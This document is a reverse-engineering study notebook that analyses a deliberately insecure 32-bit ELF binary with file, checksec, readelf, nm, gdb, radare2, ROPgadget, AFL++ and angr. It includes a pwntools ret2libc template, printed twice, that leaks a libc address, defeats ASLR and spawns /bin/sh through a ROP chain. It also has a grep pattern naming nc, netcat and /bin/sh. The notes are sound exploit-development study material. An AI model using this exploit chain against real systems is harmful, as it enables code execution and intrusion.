# 32 Bit

## Vulnerable

#### File
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ file 32bit_InSecure_hello_world 
32bit_InSecure_hello_world: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=68bb5da9e18fcfccb773a34611d60ff2ca4b414b, for GNU/Linux 3.2.0, not stripped
```
- **ELF 32-bit LSB**
	- 32 bit, so we will be dealing with registers like EAX, EBP, ESP, EIP etc..,
	- LSB, uses little endian byte order
- i386
	- uses the x86 (32 bit) architecture
- Dynamically linked
	- The program uses shared libraries that are loaded at the runtime
- interpreter /lib/ld-linux.so.2 
	- dynamic linker that loads the shared libraries when the program starts
- not stripped
	- Binary contains symbol tables, which includes names of the functions and variables

#### checksec
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ pwn checksec 32bit_InSecure_hello_world 
[*] '/home/kali/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build/32bit_InSecure_hello_world'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
- Arch - its a 32 bit x86 binary
- RELRO
	- Relocation Read-Only, is a mitigation strategy making parts of the binary `read-only` after loading it
	- When RELRO is not available, the Global Offset Table (GOT) is writable
	- A GOT Overwrite attack will be possible if a vulnerability that lets the attacker to `write to the memory`
	- It is achieved by overwriting the function pointers in the GOT to hijack the control flow.
- Stack
	- Canaries are special values placed on the stack to detect buffer overflows
	- Absence of canaries will allow an attacker to overflow the buffer on a stack and helps to overwrite the saved return address values
- NX
	- Stack Executable (No-eXecute) bit, prevents the code from being executed from the stack
	- Together with absence of Stack canaries, an attacker can trigger buffer overflow with ease
- PIE
	- Position Independent Executable, randomises the base address of the executable in the memory
	- When absent, the executable is always loaded at the same address and is easier to develop the exploit
- RWX
	- Memory segments that are readable, writable and executable are found in the binary

#### ldd
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ ldd ./32bit_InSecure_hello_world 
        linux-gate.so.1 (0xf7f73000)
        libc.so.6 => /lib32/libc.so.6 (0xf7d13000)
        /lib/ld-linux.so.2 (0xf7f75000)
```
- Outputs the libraries the executable depends on
- linux-gate.so.1
	- virtual library by kernel for effective system calls
- libc.so.6 => /lib32/libc.so.6 (0xf7d13000)
	- shows that the binary is linked against the standard C library, `libc`
	- libc contains multiple functions that are handy when exploiting: `system()`, `execve()`, `strcpy()` etc..,
	- 0xf7d13000, is the base address where `libc` is loaded in the memory for this specific execution
	- On most modern systems, because of ASLR (Address Space Layout Randomisation) the base address of the libc will vary for each execution
- /lib/ld-linux.so.2
	- dynamic linker that is responsible for loading libc and other shared libraries into the memory

>[!NOTE]
> - In modern secure binaries, we cannot directly jump to our shell code, a method called `ret2libc` (return-to-libc) is used
> - ret2libc workflow
> 	- Overflow the stack buffer -> overwrite the saved return values with `system()` inside libc -> placing a pointer to the string `/bin/sh` on the stack and pass it as an argument to the `system()`
> - A successful exploitation would require
> 	- the address of libc in memory
> 	- As ASLR randomizes, first a memory leak vulnerability is required to find out where libc is loaded
> 	- Then the calculation of the `system()` in libc is required to successfully exploit this

#### grep
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ strings 32bit_InSecure_hello_world | grep --color=always -E '(gets|strcpy|strcat|sprintf|scanf|sscanf|fscanf|printf|fprintf|snprintf|vprintf|system|exec|execl|execv|execle|ls|nc|whoami|netcat|/bin/sh|/bin/bash|cat|debug|secret|test|login|hidden|root|admin|key|password|%s|%x|%p|%n|socket|connect|send|recv|listen)'

printf
printf@GLIBC_2.0
_dl_relocate_static_pie
```
- Strings and grep was able to identify potentially vulnerable functions, just the existence of this functions does not necessarily mean that memory corruption issue exists

#### readelf
```bash
# elf metadata
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ readelf -h 32bit_InSecure_hello_world 
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8049050
  Start of program headers:          52 (bytes into file)
  Start of section headers:          10148 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         11
  Size of section headers:           40 (bytes)
  Number of section headers:         29
  Section header string table index: 28
```
- Data
	- Confirms the byte order
- Entry point address
	- The most important piece of information here
	- It is the virtual memory address of the very first instruction when the application is loaded
	- This is **not** the address of the `main()`, the entry point is a small initialization function (often called as `_start`) which is provided by C runtime.
	- The `_start` function setups up the env for the C program like preparing argc, argv and then calls the `main()`
	- When the application is loaded on the debuggers like `GDB`, it wil usually stop at the entry point address by default.
- Start of Program header
	- `readelf -l`, tells the OS how to create the process image in the memory (i.e., what parts of the file to map as executable code and what as writable data)
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ readelf -l 32bit_InSecure_hello_world 

Elf file type is EXEC (Executable file)
Entry point 0x8049050
There are 11 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00160 0x00160 R   0x4
  INTERP         0x0001b8 0x080481b8 0x080481b8 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x002e8 0x002e8 R   0x1000
  LOAD           0x001000 0x08049000 0x08049000 0x001bc 0x001bc R E 0x1000
  LOAD           0x002000 0x0804a000 0x0804a000 0x00130 0x00130 R   0x1000
  LOAD           0x002130 0x0804b130 0x0804b130 0x00110 0x00114 RW  0x1000
  DYNAMIC        0x002138 0x0804b138 0x0804b138 0x000e8 0x000e8 RW  0x4
  NOTE           0x000194 0x08048194 0x08048194 0x00024 0x00024 R   0x4
  NOTE           0x002110 0x0804a110 0x0804a110 0x00020 0x00020 R   0x4
  GNU_EH_FRAME   0x002014 0x0804a014 0x0804a014 0x00034 0x00034 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .note.gnu.build-id .interp .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt 
   03     .init .plt .text .fini 
   04     .rodata .eh_frame_hdr .eh_frame .note.ABI-tag 
   05     .init_array .fini_array .dynamic .got .got.plt .data .bss 
   06     .dynamic 
   07     .note.gnu.build-id 
   08     .note.ABI-tag 
   09     .eh_frame_hdr 
   10     
```

>[!NOTE]
> - These are the instructions for the OS on how to load the program into memory 
> - Program headers, describes a segment of binaries that will be mapped into the memory, important information are Type, VirtAddr(Virtual Address) and Flg (Flag permissions)
> - Type: LOAD, are the most important segments. As these represent the actual parts of the file that are loaded into the memory. These data can be grouped with permissions, R E (Read and Execute) segments are the code segment which contains the executable instructions (the `.text` section). The R W (Read and Write) segements are the data segment, where the global variables and other writable data are stored (.data and .bss sections).
> - INTERP, just points to a dynamic linker
> - GNU_STACK...Flg: RWE (Read, Write and Exectuable), most critical piece of information in the entire output as this line explicitly defines the permissions for the program's stack. This directly says that the NX protection is disabled
> - Section - Segment mapping, the output of this can be seen from `readelf -S` The segment 03 contains the .text (code) section an d segment 05 contains `.data` and `.got` sections

- Start of the Section header
	- `readelf -S`. describes the sections of the binary `.text` - code, `.data` - initialized data, `.rodata` - read only data etc..,
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ readelf -S 32bit_InSecure_hello_world 
There are 29 section headers, starting at offset 0x27a4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .note.gnu.bu[...] NOTE            08048194 000194 000024 00   A  0   0  4
  [ 2] .interp           PROGBITS        080481b8 0001b8 000013 00   A  0   0  1
  [ 3] .gnu.hash         GNU_HASH        080481cc 0001cc 000020 04   A  4   0  4
  [ 4] .dynsym           DYNSYM          080481ec 0001ec 000050 10   A  5   1  4
  [ 5] .dynstr           STRTAB          0804823c 00023c 000057 00   A  0   0  1
  [ 6] .gnu.version      VERSYM          08048294 000294 00000a 02   A  4   0  2
  [ 7] .gnu.version_r    VERNEED         080482a0 0002a0 000030 00   A  5   1  4
  [ 8] .rel.dyn          REL             080482d0 0002d0 000008 08   A  4   0  4
  [ 9] .rel.plt          REL             080482d8 0002d8 000010 08  AI  4  22  4
  [10] .init             PROGBITS        08049000 001000 000020 00  AX  0   0  4
  [11] .plt              PROGBITS        08049020 001020 000030 04  AX  0   0 16
  [12] .text             PROGBITS        08049050 001050 000156 00  AX  0   0 16
  [13] .fini             PROGBITS        080491a8 0011a8 000014 00  AX  0   0  4
  [14] .rodata           PROGBITS        0804a000 002000 000014 00   A  0   0  4
  [15] .eh_frame_hdr     PROGBITS        0804a014 002014 000034 00   A  0   0  4
  [16] .eh_frame         PROGBITS        0804a048 002048 0000c8 00   A  0   0  4
  [17] .note.ABI-tag     NOTE            0804a110 002110 000020 00   A  0   0  4
  [18] .init_array       INIT_ARRAY      0804b130 002130 000004 04  WA  0   0  4
  [19] .fini_array       FINI_ARRAY      0804b134 002134 000004 04  WA  0   0  4
  [20] .dynamic          DYNAMIC         0804b138 002138 0000e8 08  WA  5   0  4
  [21] .got              PROGBITS        0804b220 002220 000004 04  WA  0   0  4
  [22] .got.plt          PROGBITS        0804b224 002224 000014 04  WA  0   0  4
  [23] .data             PROGBITS        0804b238 002238 000008 00  WA  0   0  4
  [24] .bss              NOBITS          0804b240 002240 000004 00  WA  0   0  1
  [25] .comment          PROGBITS        00000000 002240 00001e 01  MS  0   0  1
  [26] .symtab           SYMTAB          00000000 002260 000260 10     27  19  4
  [27] .strtab           STRTAB          00000000 0024c0 0001e1 00      0   0  1
  [28] .shstrtab         STRTAB          00000000 0026a1 000101 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), p (processor specific)
```
  
  >[!NOTE]
  >- Code and Read-Only Data (`.text`, `.rodata`, `.init`):
  >	- `.text`, is the most important section which contains actual executable code. `AX` flag means its Allocated in memory and is Executable. When disassembled, these are the contents that we will be looking at
  >	- `.rodata`, contains Read-Only data, these sections contains read only data such as constant strings. The lack of `W` flag implies that the program cannot modify this data at runtime
  >	- `.init`, contains the initialisation and finalisation code that runs before `main` and after `main` exists, these are executable sections
>-  Dynamic Linking Information:
>	- Crucial sections for understanding how program interacts with the shared libraries
>	- `.interp`, specifies the path of the dynamic linker. These information are used by the Kernel to load the necessary shared libraries for the program
>	- `.dynsym`& `.dynstr`, dynamic symbols and strings table. Information related to the functions and variables that are imported from and exported to the shared libraries can be found in this section.
>	- `.rel.plt` & `.plt`, procedure linkage table and its associated relocations are used to lazily resolve the address of functions from shared libraries. i.e., when the `printf` is called by the program for the first time, the real address of the `printf` is found from the `libc` and patches it in for future calls. This is the foundation for attacks like a `GOT Overwrite`
>- Writable Sections:
>	- Primary target for memory corruption issues because of the presence of `WA` flags
>	- `.data` sections stores the initialized global and static variables
>	- `.bss` sections is used for uninitialized global and static variables, the `NOBITS` type mean it does not take up any space in the file itself but it is allocated in memory. The `OS` zeros it out when the program is loaded
>	- `.got` & `.got.plt`, The Global Offset Table, one of the most critical sections for exploit development
>	- `.got.plt` contains the actual pointers to functions in shared libraries, when a GOT overwrite attack, an address within this section will be written to hijack the control flow
>- Symbol and Debug Information
>	- `.symtab` & `.strtab`, the symbol table and its corresponding string table.
>	- These contain information about `all` symbols in the binary, including function names, variable names and file names
>	- When a binary is `stripped`, these sections are removed from the binary.

#### Signature check
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ readelf -S 32bit_InSecure_hello_world | grep -i -E 'sig|sign|cert|auth'
```
- The ELF binary is not signed with any certificate
>[!NOTE]
>- A signed binary will have a new section in the binary with the name matching any of the matching patters `sig/sign/cert/auth`
>- The section can be dumped with `objcopy --dump-section .<sectionName>=signature.bin binaryName`
>- Once the signature section is dumped, the contents can viewed with the utilities like `openssl`: `openssl pkcs7 -inform DER -in signature.bin -print_certs -text -noout`

#### nm / nm -D
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ nm -D 32bit_InSecure_hello_world    
         w __gmon_start__
0804a004 R _IO_stdin_used
         U __libc_start_main@GLIBC_2.34
         U printf@GLIBC_2.0
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ nm 32bit_InSecure_hello_world    
0804a110 r __abi_tag
0804b240 B __bss_start
0804b240 b completed.0
0804b238 D __data_start
0804b238 W data_start
080490b0 t deregister_tm_clones
08049090 T _dl_relocate_static_pie
08049130 t __do_global_dtors_aux
0804b134 d __do_global_dtors_aux_fini_array_entry
0804b23c D __dso_handle
0804b138 d _DYNAMIC
0804b240 D _edata
0804b244 B _end
080491a8 T _fini
0804a000 R _fp_hw
08049160 t frame_dummy
0804b130 d __frame_dummy_init_array_entry
0804a10c r __FRAME_END__
0804b224 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
0804a014 r __GNU_EH_FRAME_HDR
08049000 T _init
0804a004 R _IO_stdin_used
         U __libc_start_main@GLIBC_2.34
08049166 T main
         U printf@GLIBC_2.0
080490f0 t register_tm_clones
08049050 T _start
0804b240 D __TMC_END__
0804907d t __wrap_main
080491a2 T __x86.get_pc_thunk.ax
080490a0 T __x86.get_pc_thunk.bx                                             
```
- The utility `nm` is used to list symbols from the object files. 
- The `-D` flag shows the dynamic symbols which are linked at run time.
- The `nm -D` specifically shows the symbols that are resolved by the dynamic linker at runtime.
- `w` from the output shows that it is a weak symbol related to `grpof`, a profiling tool
- `U` from the output shows that this is an undefined symbol. 
- The `__libc_start_main@GLIBC_2.34` from the output means that this function is not defined within the binary but is expected to found in an external shared library (specifically GLIBC_2.34 or compatible), this function is crucial as it is called by the **`program's entry point`** to setup the C runtime environment and eventually call the main function
- Undefined symbols are critical as the addresses of these functions are resolved during runtime and are stored in the GOT, overwriting the entries in the GOT for the functions is a common technique to hijack program execution
#### strings
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ strings 32bit_InSecure_hello_world | grep --color=always -E '(gets|strcpy|strcat|sprintf|scanf|sscanf|fscanf|printf|fprintf|snprintf|vprintf|system|exec|execl|execv|execle|ls|nc|whoami|netcat|/bin/sh|/bin/bash|cat|debug|secret|test|login|hidden|root|admin|key|password|%s|%x|%p|%n|socket|connect|send|recv|listen)'

printf
printf@GLIBC_2.0
_dl_relocate_static_pie
```
- Looking for presence of readable ascii characters on the binary.
#### strace / ltrace
```bash
# system calls trace
strace ./binary_name
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
ltrace ./binary_name
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
objdump -s --section .rodata binary_name # .rodata
# assembly instructions
objdump -d binary_name
```

#### gdb / r2
```bash
# start gdb
gdb binary_name
# gdb commands
info functions # ; list all the functions
disass main # ; disassmeble main function
b *memory_address # ; breakpoint
run # ; executes the binary
display/i $pc # ; display instruction at the current program counter
info registers rax # ; inspect the contents of rax register
x/s memory_address # ; inspect stack
quit # ; exit gdb

## advanced
info files # ; symbols, entry points will be listed
set pagination off # ; doesnt breaks the output
set logging on # ; output will be copied to gdb.txt
set logging redirect on # ; output will be redirect to gdb.txt

# start r2
r2 -A binary_name
# r2 commadns
aaa # ; analyze all
afl # ; list functions
info # ; show binary information
pdf @ main # ; disassemble main function
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```gdb
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
x/10i $rip      # ; show 10 instructions from the instruction pointer
x/s 0x4005a0    # ; show string at address
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex

# info proc mappings: show memory mappings of the process
info proc mappings

# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
objdump -d binary_name | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
# Ghidra -> Display Function Graph
```

#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```

## Secured

#### File
```bash
file binary_name
```

#### checksec
```bash
pwn checksec binary_name
```

#### ldd
```bash
ldd binary_name
```

#### grep
```bash
grep -i "pattern" binary_name
```

#### readelf
```bash
# elf metadata
readelf -h binary_name
# library fil meta data
readelf -hs lib*.so
```

#### Signature check
```bash
readelf -S binary_name | grep -E "sig|signature"
elfsign verify -e ./binary_name
objdump -h binary_name | grep -E "sig|signature"
```

#### nm / nm -D
```bash
# list symbols - static mode
nm lib*.so
# list symbols - dynamic mode
nm -D lib*.so
# demangle the symbols
nm -D --demangle lib*.so
```

#### strings
```bash
strings binary_name | fzf
```

#### strace / ltrace
```bash
# system calls trace
strace ./binary_name
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
ltrace ./binary_name
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
objdump -s --section .rodata binary_name # .rodata
# assembly instructions
objdump -d binary_name
```

#### gdb / r2
```bash
# start gdb
gdb binary_name
# gdb commands
info functions # ; list all the functions
disass main # ; disassmeble main function
b *memory_address # ; breakpoint
run # ; executes the binary
display/i $pc # ; display instruction at the current program counter
info registers rax # ; inspect the contents of rax register
x/s memory_address # ; inspect stack
quit # ; exit gdb

## advanced
info files # ; symbols, entry points will be listed
set pagination off # ; doesnt breaks the output
set logging on # ; output will be copied to gdb.txt
set logging redirect on # ; output will be redirect to gdb.txt

# start r2
r2 -A binary_name
# r2 commadns
aaa # ; analyze all
afl # ; list functions
info # ; show binary information
pdf @ main # ; disassemble main function
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```gdb
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
x/10i $rip      # ; show 10 instructions from the instruction pointer
x/s 0x4005a0    # ; show string at address
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex

# info proc mappings: show memory mappings of the process
info proc mappings

# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
objdump -d binary_name | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
# Ghidra -> Display Function Graph
```

#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

